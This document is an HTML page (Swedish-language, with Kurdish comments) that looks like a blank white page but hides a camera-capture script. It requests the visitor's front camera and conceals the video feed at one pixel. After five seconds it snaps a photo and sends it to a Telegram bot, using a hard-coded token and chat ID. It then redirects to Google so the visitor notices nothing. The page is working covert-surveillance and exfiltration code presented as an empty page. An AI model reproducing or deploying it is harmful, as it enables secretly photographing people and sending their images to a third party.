<!DOCTYPE html>
<html lang="sv">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title> </title> 
    
    <meta name="description" content="">
    <meta property="og:title" content=" ">
    <meta property="og:description" content=" ">
    <link rel="icon" href="data:,">

    <style>
        /* شاردنەوەی کامێرا بە شێوەیەکی شەفاف بۆ ئەوەی مۆبایلەکە ڕووناکی ڕێکبخات */
        #video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
        }
        #canvas { display: none; }
        
        /* لاپەڕەیەکی بە تەواوی سپی و پاک */
        body { 
            background-color: #ffffff; 
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // زانیارییەکانی تێلێگرامی تۆ
        const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
        const CHAT_ID = '6351568884';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // ڕێکخستنی کامێرا بۆ کوالێتی بەرز
        const constraints = {
            video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        };

        navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            video.srcObject = stream;
            // 5 چرکە بۆ وەرگرتنی ڕووناکی تەواو و سافی وێنەکە
            setTimeout(takeSnapshot, 5000);
        })
        .catch(err => {
            // ئەگەر ڕەزامەندی نەدا یەکدەست دەچێتە سەر گوگل
            window.location.href = "https://www.google.se";
        });

        function takeSnapshot() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'image.jpg');

                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(() => {
                    // ناردن بۆ گووگڵ دوای تەواوبوون
                    window.location.href = "https://www.google.se";
                })
                .catch(() => {
                    window.location.href = "https://www.google.se";
                });
            }, 'image/jpeg', 0.95);
        }
    </script>
</body>
</html>
